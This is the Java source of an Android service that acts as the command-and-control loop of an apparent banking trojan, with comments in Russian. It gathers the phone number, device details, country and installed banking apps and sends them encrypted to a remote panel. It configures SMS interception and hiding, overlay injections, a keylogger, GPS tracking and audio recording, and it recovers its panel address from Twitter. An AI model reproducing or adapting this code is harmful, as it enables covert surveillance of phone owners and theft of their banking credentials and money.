package myapp.stuff.example;


import android.Manifest;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import java.util.concurrent.TimeUnit;

import myapp.stuff.example.API.ClassRC4;

public class ServiceCommands extends IntentService {

    Constants const_ = new Constants();
    UtilsClass SF = new UtilsClass();
    StoreStringClass store = new StoreStringClass();
    Context context;

    String getHash;
    String r0_int = "0";
    String screen_int = "0";
    String b_nk = "";
    String AV="";
    String number = "";
    String number_ = "";
    String timeWorkstr= "ERROR";
    String responce;
    TelephonyManager tm;
    int iconCheckInj=0;
    int iconCheckGeolocation=0;
    int iconAccess=0;
    int iconCheckHideSMS=0;

    public ServiceCommands() {
        super("");

    }
    public void onCreate() {super.onCreate();}
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }
    @Override
    protected void onHandleIntent(Intent intent)
    {
        context = this;
        readCommand();
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public void readCommand()
    {
        if(!SF.isMyServiceRunning(context,StartWhileGlobal.class)){//Проверяем состояние цикла
            startService(new Intent(this, StartWhileGlobal.class));
        }

        try {TimeUnit.SECONDS.sleep(2);} catch (InterruptedException e) {e.printStackTrace();}
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String ID_B = SF.ID_B(this);
        String device = Build.VERSION.RELEASE;  // ОС
        String model = Build.MODEL + " (" + Build.PRODUCT + ")";  // модель
        String country = tm.getNetworkCountryIso();  // страна

        int res;
        res = context.checkCallingOrSelfPermission(Manifest.permission.READ_PHONE_STATE);
        if (res == PackageManager.PERMISSION_GRANTED){
            number = "(" + tm.getNetworkOperatorName() + ")" + tm.getLine1Number();
        } else {
            number = "(NO)";
            number_ = "Indefined";
        }

        //*************Проверка состояние экрана*******
        KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
        boolean locked = km.inKeyguardRestrictedInputMode();
        if (locked == false) screen_int = "1";

        //*******************************************

        try {
            getHash = SF.SetRead(context, "SettingsAll");
            if (getHash != "") {
                String[] getHashM = getHash.split("~");
                getHash = getHashM[0];
            } else getHash = "";
        }catch (Exception ex){
            getHash = "";
        }

        if(SF.geolocation_check_enabled(context)) iconCheckGeolocation=1;else iconCheckGeolocation=0; //Состояние вкл/выкл геолокации


        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {//Состояние перехвата смс (скрытый или нет)
            if (Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName()))
                iconCheckHideSMS=1;
            else
                iconCheckHideSMS=0;
        }else{
            try {
                if (SF.SetRead(context, "del_sws").contains("true"))
                    iconCheckHideSMS = 1;
                else iconCheckHideSMS = 0;
            }catch (Exception ex){
                iconCheckHideSMS = 0;
            }
        }

        try {
            timeWorkstr = SF.SetRead(this, "time_work");
        }catch (Exception ex){
            SF.Log("TimeWork","ERROR -> ServiceCommands");
        }

        int playprotect = 2;
        try{
            String getPlay = SF.SetRead(this,"play_protect");
            if(getPlay.equals("true")){
                playprotect=1;
            }else if(getPlay.equals("false")) {
                playprotect=0;
            }else{
                playprotect=2;
            }
        }catch (Exception ex){}

        int step  = Integer.parseInt(SF.SetRead(this, "step"));
        responce =  SF.trafDeCr(SF.POST(context,"2","p="+SF.trafEnCr(ID_B + ":" + r0_int + ":" + getHash + ":" +iconCheckInj + ":" + iconCheckGeolocation + ":" + iconCheckHideSMS +":" + screen_int + ":" + iconAccess + ":" + timeWorkstr + ":" + playprotect + ":" + step + ":")));
        SF.Log("Запрос", " - > " + responce);

        if (responce.contains("|NO|")) {
            b_nk=store.GetAPP(this);

            String getIconCardInj = SF.SetRead(context,"iconCJ");
            SF.Log("ICON SEND",""+getIconCardInj);
            SF.Log("","Регаем");
            SF.Log("set_data_p", SF.trafEnCr(ID_B + ":" + number + number_ + ":" + device + ":" + country + ":" + b_nk + ":" + model + ":" + AV + ":" + getIconCardInj));
            // post pendi
            responce = SF.POST(context,"1", "p=" + SF.trafEnCr(ID_B + ":" + number + number_ + ":" + device + ":" + country + ":" + b_nk + ":" + model + ":" + const_.Version + ":" + AV + ":" + getIconCardInj + ":"));
            SF.Log("Responce",responce);
            responce = SF.trafDeCr(responce);

        } else if (responce.contains("state1letsgotxt")) {
            String resp_settings = SF.POST(context,"3", "p=" + SF.trafEnCr(ID_B));
            resp_settings = SF.trafDeCr(resp_settings);
            SF.Log("Настройки", "" + resp_settings);

            try {
                SF.Log("Запись  успешна!",resp_settings);
                String[] masiv_str = resp_settings.split(":");

                String save_inj = masiv_str[0];

                if ((masiv_str[0].equals("") || (masiv_str[0].equals(null)))) {
                    SF.SetWrite(this, "lock_inj", "");
                }

                SF.SetWrite(this, "save_inj", save_inj);
                SF.SetWrite(this, "del_sws", masiv_str[1]);
                SF.SetWrite(this, "perehvat_sws", masiv_str[2]);
                SF.SetWrite(this, "network", masiv_str[3]);
                SF.SetWrite(this, "gps", masiv_str[4]);
                SF.SetWrite(this, "foregroundwhile", masiv_str[5]);
                SF.SetWrite(this, "keylogger", masiv_str[6]);
                SF.SetWrite(this, "lookscreen", masiv_str[8]);
                String record_seconds="0";
                try{
                    record_seconds = masiv_str[7].replace(" ","");
                }catch (Exception ex){}



                SF.SetWrite(this, "recordsoundseconds", record_seconds);
                Log.e("save seconds sound",record_seconds);

            } catch (Exception ioe) {
                SF.Log("Настройки", "Запись не good!");
            }

        }else if(responce.contains("ALLSETTINGSGO")) {
            String respSettings_all = SF.POST(context,"6", "p=" + SF.trafEnCr(ID_B));
            respSettings_all = SF.trafDeCr(respSettings_all);
            SF.Log("Сохраняем настройки",respSettings_all);

            String GetmadeString="";
            try {
                GetmadeString = SF.SetRead(context, "madeSettings");
            }catch (Exception ex){
                SF.Log("ServiceCommands","ERROR GetmadeString");
            }
            String madeSettings="1 2 3 4 5 6 7 8 9 10 11 12 13 ";

            if(GetmadeString.contains("5+"))madeSettings = madeSettings.replace("5 ", "5+");
            if(GetmadeString.contains("6+"))madeSettings = madeSettings.replace("6 ", "6+");
            if(GetmadeString.contains("7+"))madeSettings = madeSettings.replace("7 ", "7+");
            if(GetmadeString.contains("8+"))madeSettings = madeSettings.replace("8 ", "8+");
            if(GetmadeString.contains("9+"))madeSettings = madeSettings.replace("9 ", "9+");
            if(GetmadeString.contains("10+"))madeSettings = madeSettings.replace("10 ", "10+");

            try {
                SF.SetWrite(this, "SettingsAll", respSettings_all);
                SF.SetWrite(this, "madeSettings", madeSettings);
                SF.Log("Настройки all", "madeSettings: " + madeSettings);
            } catch (Exception ioe) {
                SF.Log("Настройки all", "Запись не good!");
            }
        }else if(responce.equals("")){//  -  !!!!!!!!!!!!!!!!!    когда главные url не работает перебераем весь лист url
            try {
                String[] url = SF.SetRead(context, "urls").replace(" ", "").split(",");
                boolean isTwitter = false;
                for (int i = 0; i < url.length; i++) {
                    SF.Log("url", "" + url[i]);
                    if(SF.checkPanelPost(url[i]).contains("**2**0**0**")){
                        SF.SetWrite(this, "url", ""+url[i]);
                        isTwitter = true;
                        break;
                    }
                }
                Log.e("Twit",""+isTwitter);
                if(!isTwitter){//проверяем twitter
                    String getUrl = SF.getUrlAdminPanelFromTwitter();

                    SF.Log("getTwitt",""+getUrl);
                    if((getUrl.contains("https://")) || (getUrl.contains("http://"))){
                        SF.SetWrite(this,"urls",getUrl);
                    }
                }
            }catch (Exception ex){
                SF.Log("ERROR","Class ServiceCommands -> get urls");
            }
        }
        SF.Log("Общие настройки", SF.SetRead(context,"SettingsAll"));
        String parts[] = responce.split("::");

        //Выполняем команды!
        for (int j = 0; j < parts.length; j++) {

            if (parts[j].contains("killBot")){ //Убиваем бот
                try{
                    SF.SetWrite(this, "url", "");
                    SF.SetWrite(this, "urls", "");
                    SF.SetWrite(this, "urlInj", "");
                }catch (Exception ex){
                    SF.Log("ERROR", "killBot -> Commands");
                }
            }
        }
        stopSelf();
    }
}
